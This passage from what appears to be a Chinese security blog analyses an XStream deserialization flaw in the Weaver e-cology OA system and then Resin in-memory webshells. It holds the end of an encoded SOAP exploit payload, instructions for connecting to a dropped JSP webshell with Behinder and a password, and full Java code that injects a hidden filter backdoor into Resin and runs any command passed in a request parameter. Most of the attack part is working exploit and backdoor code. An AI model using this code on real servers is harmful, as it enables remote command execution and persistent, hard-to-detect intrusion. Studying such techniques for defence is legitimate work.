#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#112;&amp;#114;&amp;#111;&amp;#99;&amp;#101;&amp;#115;&amp;#115;&amp;#111;&amp;#114;&amp;#67;&amp;#76;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#105;&amp;#116;&amp;#101;&amp;#114;&amp;#97;&amp;#116;&amp;#111;&amp;#114;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#116;&amp;#121;&amp;#112;&amp;#101;&amp;gt;&amp;#75;&amp;#69;&amp;#89;&amp;#83;&amp;lt;&amp;#47;&amp;#116;&amp;#121;&amp;#112;&amp;#101;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#101;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#105;&amp;#110;&amp;#32;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#61;&amp;apos;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#46;&amp;#105;&amp;#111;&amp;#46;&amp;#66;&amp;#121;&amp;#116;&amp;#101;&amp;#65;&amp;#114;&amp;#114;&amp;#97;&amp;#121;&amp;#73;&amp;#110;&amp;#112;&amp;#117;&amp;#116;&amp;#83;&amp;#116;&amp;#114;&amp;#101;&amp;#97;&amp;#109;&amp;apos;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#98;&amp;#117;&amp;#102;&amp;gt;&amp;lt;&amp;#47;&amp;#98;&amp;#117;&amp;#102;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#112;&amp;#111;&amp;#115;&amp;gt;&amp;#48;&amp;lt;&amp;#47;&amp;#112;&amp;#111;&amp;#115;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#109;&amp;#97;&amp;#114;&amp;#107;&amp;gt;&amp;#48;&amp;lt;&amp;#47;&amp;#109;&amp;#97;&amp;#114;&amp;#107;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#99;&amp;#111;&amp;#117;&amp;#110;&amp;#116;&amp;gt;&amp;#48;&amp;lt;&amp;#47;&amp;#99;&amp;#111;&amp;#117;&amp;#110;&amp;#116;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#105;&amp;#110;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#105;&amp;#115;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#99;&amp;#111;&amp;#110;&amp;#115;&amp;#117;&amp;#109;&amp;#101;&amp;#100;&amp;gt;&amp;#102;&amp;#97;&amp;#108;&amp;#115;&amp;#101;&amp;lt;&amp;#47;&amp;#99;&amp;#111;&amp;#110;&amp;#115;&amp;#117;&amp;#109;&amp;#101;&amp;#100;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#100;&amp;#97;&amp;#116;&amp;#97;&amp;#83;&amp;#111;&amp;#117;&amp;#114;&amp;#99;&amp;#101;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#116;&amp;#114;&amp;#97;&amp;#110;&amp;#115;&amp;#102;&amp;#101;&amp;#114;&amp;#70;&amp;#108;&amp;#97;&amp;#118;&amp;#111;&amp;#114;&amp;#115;&amp;#47;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#100;&amp;#97;&amp;#116;&amp;#97;&amp;#72;&amp;#97;&amp;#110;&amp;#100;&amp;#108;&amp;#101;&amp;#114;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#100;&amp;#97;&amp;#116;&amp;#97;&amp;#76;&amp;#101;&amp;#110;&amp;gt;&amp;#48;&amp;lt;&amp;#47;&amp;#100;&amp;#97;&amp;#116;&amp;#97;&amp;#76;&amp;#101;&amp;#110;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#99;&amp;#111;&amp;#109;&amp;#46;&amp;#115;&amp;#117;&amp;#110;&amp;#46;&amp;#120;&amp;#109;&amp;#108;&amp;#46;&amp;#105;&amp;#110;&amp;#116;&amp;#101;&amp;#114;&amp;#110;&amp;#97;&amp;#108;&amp;#46;&amp;#98;&amp;#105;&amp;#110;&amp;#100;&amp;#46;&amp;#118;&amp;#50;&amp;#46;&amp;#114;&amp;#117;&amp;#110;&amp;#116;&amp;#105;&amp;#109;&amp;#101;&amp;#46;&amp;#117;&amp;#110;&amp;#109;&amp;#97;&amp;#114;&amp;#115;&amp;#104;&amp;#97;&amp;#108;&amp;#108;&amp;#101;&amp;#114;&amp;#46;&amp;#66;&amp;#97;&amp;#115;&amp;#101;&amp;#54;&amp;#52;&amp;#68;&amp;#97;&amp;#116;&amp;#97;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#99;&amp;#111;&amp;#109;&amp;#46;&amp;#115;&amp;#117;&amp;#110;&amp;#46;&amp;#120;&amp;#109;&amp;#108;&amp;#46;&amp;#105;&amp;#110;&amp;#116;&amp;#101;&amp;#114;&amp;#110;&amp;#97;&amp;#108;&amp;#46;&amp;#98;&amp;#105;&amp;#110;&amp;#100;&amp;#46;&amp;#118;&amp;#50;&amp;#46;&amp;#114;&amp;#117;&amp;#110;&amp;#116;&amp;#105;&amp;#109;&amp;#101;&amp;#46;&amp;#117;&amp;#110;&amp;#109;&amp;#97;&amp;#114;&amp;#115;&amp;#104;&amp;#97;&amp;#108;&amp;#108;&amp;#101;&amp;#114;&amp;#46;&amp;#66;&amp;#97;&amp;#115;&amp;#101;&amp;#54;&amp;#52;&amp;#68;&amp;#97;&amp;#116;&amp;#97;&amp;#32;&amp;#114;&amp;#101;&amp;#102;&amp;#101;&amp;#114;&amp;#101;&amp;#110;&amp;#99;&amp;#101;&amp;#61;&amp;apos;&amp;#46;&amp;#46;&amp;#47;&amp;#99;&amp;#111;&amp;#109;&amp;#46;&amp;#115;&amp;#117;&amp;#110;&amp;#46;&amp;#120;&amp;#109;&amp;#108;&amp;#46;&amp;#105;&amp;#110;&amp;#116;&amp;#101;&amp;#114;&amp;#110;&amp;#97;&amp;#108;&amp;#46;&amp;#98;&amp;#105;&amp;#110;&amp;#100;&amp;#46;&amp;#118;&amp;#50;&amp;#46;&amp;#114;&amp;#117;&amp;#110;&amp;#116;&amp;#105;&amp;#109;&amp;#101;&amp;#46;&amp;#117;&amp;#110;&amp;#109;&amp;#97;&amp;#114;&amp;#115;&amp;#104;&amp;#97;&amp;#108;&amp;#108;&amp;#101;&amp;#114;&amp;#46;&amp;#66;&amp;#97;&amp;#115;&amp;#101;&amp;#54;&amp;#52;&amp;#68;&amp;#97;&amp;#116;&amp;#97;&amp;apos;&amp;#47;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#46;&amp;#117;&amp;#116;&amp;#105;&amp;#108;&amp;#46;&amp;#80;&amp;#114;&amp;#105;&amp;#111;&amp;#114;&amp;#105;&amp;#116;&amp;#121;&amp;#81;&amp;#117;&amp;#101;&amp;#117;&amp;#101;&amp;gt;&amp;#13;&amp;#10;&amp;lt;&amp;#47;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#46;&amp;#117;&amp;#116;&amp;#105;&amp;#108;&amp;#46;&amp;#80;&amp;#114;&amp;#105;&amp;#111;&amp;#114;&amp;#105;&amp;#116;&amp;#121;&amp;#81;&amp;#117;&amp;#101;&amp;#117;&amp;#101;&amp;gt;</span></span><br><span class="line"><span class="comment">&lt;/web:in0&gt;</span></span><br><span class="line"><span class="comment">         &lt;!--type: int--&gt;</span></span><br><span class="line"><span class="comment">         &lt;web:in1&gt;3&lt;/web:in1&gt;</span></span><br><span class="line"><span class="comment">      &lt;/web:doCreateWorkflowRequest&gt;</span></span><br><span class="line"><span class="comment">   &lt;/soapenv:Body&gt;</span></span><br><span class="line"><span class="comment">&lt;/soapenv:Envelope&gt;</span></span><br></pre></td></tr></table></figure>

<p>​        访问SystemRightqroup.jsp,使用冰蝎3连接，密码sectest666</p>
<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210513205756559.png" alt="image-20210513205756559"></p>
<h4 id="写内存马"><a href="#写内存马" class="headerlink" title="写内存马"></a>写内存马</h4><p>​        之前想要写resin的内存马，看网上的文章是需要获取webapp对象，但是我经过分析并没有找到可以获取webapp对象的方法，今天刚好在网上看到了有人给出了resin写内存马的exp。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader classloader = Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">Class servletInvocationcls = classloader.loadClass(<span class="string">"com.caucho.server.dispatch.ServletInvocation"</span>);</span><br><span class="line">Class filterConfigimplcls = classloader.loadClass(<span class="string">"com.caucho.server.dispatch.FilterConfigImpl"</span>);</span><br><span class="line">Class filterMappingcls = classloader.loadClass(<span class="string">"com.caucho.server.dispatch.FilterMapping"</span>);</span><br><span class="line">Class filterMappercls = classloader.loadClass(<span class="string">"com.caucho.server.dispatch.FilterMapper"</span>);</span><br><span class="line"></span><br><span class="line">Object contextRequest = servletInvocationcls.getMethod(<span class="string">"getContextRequest"</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line">WebApp webapp = (WebApp)contextRequest.getClass().getMethod(<span class="string">"getWebApp"</span>).invoke(contextRequest);</span><br><span class="line"></span><br><span class="line">String newFilterStr = <span class="string">"newfilter"</span>;</span><br><span class="line">Filter newFilter = <span class="keyword">new</span> newfilter();</span><br><span class="line">Class newFiltercls = newFilter.getClass();</span><br><span class="line"></span><br><span class="line">FilterConfigImpl filterConfigimpl = (FilterConfigImpl)filterConfigimplcls.newInstance();</span><br><span class="line">filterConfigimpl.setFilterName(newFilterStr);</span><br><span class="line">filterConfigimpl.setFilter(newFilter);</span><br><span class="line">filterConfigimpl.setFilterClass(newFiltercls);</span><br><span class="line"></span><br><span class="line">webapp.addFilter(filterConfigimpl);</span><br><span class="line"></span><br><span class="line">FilterMapping filterMapping = (FilterMapping)filterMappingcls.newInstance();</span><br><span class="line">FilterMapping.URLPattern filterMappingUrlpattern = filterMapping.createUrlPattern();</span><br><span class="line">filterMappingUrlpattern.addText(<span class="string">"/abcd"</span>);</span><br><span class="line">filterMappingUrlpattern.init();</span><br><span class="line">filterMapping.setFilterName(newFilterStr);</span><br><span class="line">filterMapping.setServletContext(webapp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//set filtterMapper</span></span><br><span class="line">Field fieldWebappFilterMapper = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    fieldWebappFilterMapper = webapp.getClass().getDeclaredField(<span class="string">"_filterMapper"</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (NoSuchFieldException Exception)&#123;</span><br><span class="line">    fieldWebappFilterMapper = webapp.getClass().getSuperclass().getDeclaredField(<span class="string">"_filterMapper"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fieldWebappFilterMapper.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">FilterMapper filtermapper = (FilterMapper) fieldWebappFilterMapper.get(webapp);</span><br><span class="line"></span><br><span class="line">Field fieldFilterMapperFilterMap = filterMappercls.getDeclaredField(<span class="string">"_filterMap"</span>);</span><br><span class="line">fieldFilterMapperFilterMap.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">ArrayList&lt;FilterMapping&gt; orginalfilterMappings = (ArrayList) fieldFilterMapperFilterMap.get(filtermapper);</span><br><span class="line">ArrayList&lt;FilterMapping&gt; newFilterMappings = <span class="keyword">new</span> ArrayList(orginalfilterMappings.size() + <span class="number">1</span>);</span><br><span class="line">newFilterMappings.add(filterMapping);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(count &lt; orginalfilterMappings.size())&#123;</span><br><span class="line">    newFilterMappings.add(orginalfilterMappings.get(count));</span><br><span class="line">    ++ count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fieldFilterMapperFilterMap.set(filtermapper, newFilterMappings);</span><br><span class="line">fieldWebappFilterMapper.set(webapp, filtermapper);</span><br><span class="line"></span><br><span class="line"><span class="comment">//set loginFilterMapper</span></span><br><span class="line">Field fieldWebappLoginFilterMapper = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    fieldWebappLoginFilterMapper = webapp.getClass().getDeclaredField(<span class="string">"_loginFilterMapper"</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (NoSuchFieldException Exception)&#123;</span><br><span class="line">    fieldWebappLoginFilterMapper = webapp.getClass().getSuperclass().getDeclaredField(<span class="string">"_loginFilterMaper"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fieldWebappLoginFilterMapper.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">FilterMapper loginFilterMapper = (FilterMapper)fieldWebappLoginFilterMapper.get(webapp);</span><br><span class="line"></span><br><span class="line">ArrayList&lt;FilterMapping&gt;  orginLoginFilterMappings = (ArrayList) fieldFilterMapperFilterMap.get(loginFilterMapper);</span><br><span class="line">ArrayList&lt;FilterMapping&gt; newLoginFilterMappings = <span class="keyword">new</span> ArrayList(orginLoginFilterMappings.size() + <span class="number">1</span>);</span><br><span class="line">newLoginFilterMappings.add(filterMapping);</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>( count &lt; orginLoginFilterMappings.size())&#123;</span><br><span class="line">    newLoginFilterMappings.add(orginLoginFilterMappings.get(count));</span><br><span class="line">    ++ count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fieldFilterMapperFilterMap.set(loginFilterMapper, newLoginFilterMappings);</span><br><span class="line">fieldWebappLoginFilterMapper.set(webapp, loginFilterMapper);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">webapp.getClass().getMethod(<span class="string">"clearCache"</span>).invoke(webapp);</span><br></pre></td></tr></table></figure>

<p>​        下面我也实现了一个filter cmd马的demo，这里需要注意的是，通过filter内存马不能植入冰蝎，因为冰蝎需要获取pagecontext对象，而filter无法获取pagecontext对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.server.dispatch.FilterConfigImpl;<span class="keyword">import</span> com.caucho.server.dispatch.FilterMapper;<span class="keyword">import</span> com.caucho.server.dispatch.FilterMapping;<span class="keyword">import</span> com.caucho.server.webapp.WebApp;<span class="keyword">import</span> javax.servlet.*;<span class="keyword">import</span> javax.servlet.http.HttpServlet;<span class="keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="keyword">import</span> java.io.BufferedReader;<span class="keyword">import</span> java.io.IOException;<span class="keyword">import</span> java.io.InputStreamReader;<span class="keyword">import</span> java.io.PrintWriter;<span class="keyword">import</span> java.lang.reflect.Field;<span class="keyword">import</span> java.lang.reflect.InvocationTargetException;<span class="keyword">import</span> java.util.ArrayList;<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;    <span class="class"><span class="keyword">class</span> <span class="title">ResinFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;        <span class="keyword">private</span> <span class="keyword">final</span> String cmdParamName = <span class="string">"sectest666"</span>;        <span class="function"><span class="keyword">private</span> <span class="title">ResinFilter</span><span class="params">()</span> </span>&#123;        &#125;        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;        &#125;        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;            String cmd;            <span class="keyword">if</span> ((cmd = servletRequest.getParameter(<span class="string">"sectest666"</span>)) == <span class="keyword">null</span>) &#123;                filterChain.doFilter(servletRequest, servletResponse);            &#125; <span class="keyword">else</span> &#123;                Process process = Runtime.getRuntime().exec(cmd);                BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream()));                StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();                String line;                <span class="keyword">while</span>((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;                    stringBuilder.append(line + <span class="string">'\n'</span>);                &#125;                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());                servletResponse.getOutputStream().flush();                servletResponse.getOutputStream().close();            &#125;        &#125;        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;        &#125;    &#125;    <span class="meta">@Override</span>    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;        ClassLoader classloader = Thread.currentThread().getContextClassLoader();        Class servletInvocationcls = <span class="keyword">null</span>;        <span class="keyword">try</span> &#123;             servletInvocationcls = classloader.loadClass(<span class="string">"com.caucho.server.webapp.WebApp"</span>);            Class filterConfigimplcls = classloader.loadClass(<span class="string">"com.caucho.server.dispatch.FilterConfigImpl"</span>);            Class filterMappingcls = classloader.loadClass(<span class="string">"com.caucho.server.dispatch.FilterMapping"</span>);            Class filterMappercls = classloader.loadClass(<span class="string">"com.caucho.server.dispatch.FilterMapper"</span>);            WebApp webapp =  (WebApp)servletInvocationcls.getMethod(<span class="string">"getCurrent"</span>).invoke(<span class="keyword">null</span>);<span class="comment">//            WebApp webapp = servletService.getMethod("getDefaultWebApp").invoke(null);            String newFilterStr = "ResinShell";            Filter test=new ResinFilter();            Class ResinFilter=test.getClass();            FilterConfigImpl filterConfigimpl = (FilterConfigImpl)filterConfigimplcls.newInstance();            filterConfigimpl.setFilterName(newFilterStr);            filterConfigimpl.setFilter(test);            filterConfigimpl.setFilterClass(ResinFilter);            webapp.addFilter(filterConfigimpl);            FilterMapping filterMapping = (FilterMapping)filterMappingcls.newInstance();            FilterMapping.URLPattern filterMappingUrlpattern = filterMapping.createUrlPattern();            filterMappingUrlpattern.addText("/abcd");            filterMappingUrlpattern.init();            filterMapping.setFilterName(newFilterStr);            filterMapping.setServletContext(webapp);            Field fieldWebappFilterMapper = null;            try &#123;                fieldWebappFilterMapper = webapp.getClass().getDeclaredField("_filterMapper");            &#125; catch (NoSuchFieldException var23) &#123;                fieldWebappFilterMapper = webapp.getClass().getSuperclass().getDeclaredField("_filterMapper");            &#125;            fieldWebappFilterMapper.setAccessible(true);            FilterMapper filtermapper = (FilterMapper)fieldWebappFilterMapper.get(webapp);            Field fieldFilterMapperFilterMap = filterMappercls.getDeclaredField("_filterMap");            fieldFilterMapperFilterMap.setAccessible(true);            ArrayList&lt;FilterMapping&gt; orginalfilterMappings = (ArrayList)fieldFilterMapperFilterMap.get(filtermapper);            ArrayList&lt;FilterMapping&gt; newFilterMappings = new ArrayList(orginalfilterMappings.size() + 1);            newFilterMappings.add(filterMapping);            int count;            for(count = 0; count &lt; orginalfilterMappings.size(); ++count) &#123;                newFilterMappings.add(orginalfilterMappings.get(count));            &#125;            fieldFilterMapperFilterMap.set(filtermapper, newFilterMappings);            fieldWebappFilterMapper.set(webapp, filtermapper);            Field fieldWebappLoginFilterMapper = null;            try &#123;                fieldWebappLoginFilterMapper = webapp.getClass().getDeclaredField("_loginFilterMapper");            &#125; catch (NoSuchFieldException var22) &#123;                fieldWebappLoginFilterMapper = webapp.getClass().getSuperclass().getDeclaredField("_loginFilterMaper");            &#125;            fieldWebappLoginFilterMapper.setAccessible(true);            FilterMapper loginFilterMapper = (FilterMapper)fieldWebappLoginFilterMapper.get(webapp);            ArrayList&lt;FilterMapping&gt; orginLoginFilterMappings = (ArrayList)fieldFilterMapperFilterMap.get(loginFilterMapper);            ArrayList&lt;FilterMapping&gt; newLoginFilterMappings = new ArrayList(orginLoginFilterMappings.size() + 1);            newLoginFilterMappings.add(filterMapping);            for(count = 0; count &lt; orginLoginFilterMappings.size(); ++count) &#123;                newLoginFilterMappings.add(orginLoginFilterMappings.get(count));            &#125;            fieldFilterMapperFilterMap.set(loginFilterMapper, newLoginFilterMappings);            fieldWebappLoginFilterMapper.set(webapp, loginFilterMapper);            webapp.getClass().getMethod("clearCache").invoke(webapp);        &#125;        catch (ClassNotFoundException | NoSuchMethodException e) &#123;            e.printStackTrace();        &#125; catch (InstantiationException e) &#123;            e.printStackTrace();        &#125; catch (InvocationTargetException e) &#123;            e.printStackTrace();        &#125; catch (NoSuchFieldException e) &#123;            e.printStackTrace();        &#125; catch (IllegalAccessException e) &#123;            e.printStackTrace();        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;    @Override    public void destroy() &#123;        System.out.println("servlet has been destory!!!");        super.destroy();    &#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>​        访问servlet后会注入filter,大致效果如下</p>
<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210514162909484.png" alt="image-20210514162909484"></p>
<h4 id="Filter内存马原理分析"><a href="#Filter内存马原理分析" class="headerlink" title="Filter内存马原理分析"></a>Filter内存马原理分析</h4><p>​        首先我们自己注册一个Filter,查看到达自定义filter的调用链，可以看到我们自定义的filter被存储在this._filter中，而<code>this._filter</code>又是通过创建FilterFilterChain对象得到的赋值，因此需要去搜索哪里创建了这个对象。</p>
<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210515124917837.png" alt="image-20210515124917837"></p>
<p>​        所以我们在<code>com.caucho.server.dispatch.FilterFilterChain#FilterFilterChain</code>方法上创建一个方法断点，重启webserver,在<code>com.caucho.server.dispatch.FilterMapper#addFilter</code>中进行了调用，addFilter中的chain和filter主要来自于上层调用的<code>com.caucho.server.dispatch.FilterMapper#buildDispatchChain</code>方法，因此我们需要分析这个方法。</p>
<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210515125750903.png" alt="image-20210515125750903"></p>
<p>​        我们主要关注如何得到filter，filter对象是通过<code>this._filterManager.createFilter(filterName);</code>执行后得到的结果，其中filteName是通过this._filterMap得到的，所以要创建filter需要得到<code>this._filterMap</code>。</p>
<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210515130534518.png" alt="image-20210515130534518"></p>
<p>​        在看看<code>com.caucho.server.dispatch.FilterManager#createFilter</code>方法，即使获取了filterName对象，需要从this._filters获取对应的FilterConfigImpl实现类。可以通过<code>com.caucho.server.dispatch.FilterManager#addFilter</code>进行添加。需要传入一个FilterConfigImpl实例。</p>
<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210515130803038.png" alt="image-20210515130803038"></p>
<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210515143736696.png" alt="image-20210515143736696"></p>
<p>​        在addFilter处下一个方法断点，可以看到通过<code>com.caucho.server.webapp.WebApp#addFilter(com.caucho.server.dispatch.FilterConfigImpl)</code>调用了addFilter方法。这里需要一个this._filterManager对象，在初始化webApp类时即可获取该对象，因此只要得到WebApp即可获取 _filterManager.</p>
<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210515144121944.png" alt="image-20210515144121944"></p>
<p>​        再看看 _filterMap是如何获取的，可以看到是在<code>com.caucho.server.dispatch.FilterMapper#addFilterMapping</code>中通过<code>this._filterMap.add(mapping);</code>添加得到的。但这里有两点需要注意，一方面是mapping也是传进来的，另一方面只有<code>this._filterManager.getFilter(filterName)</code>不为空才会执行add方法。所以再调用add之前需要给this._filterManager添加我们的FilterConfigImpl对象。</p>
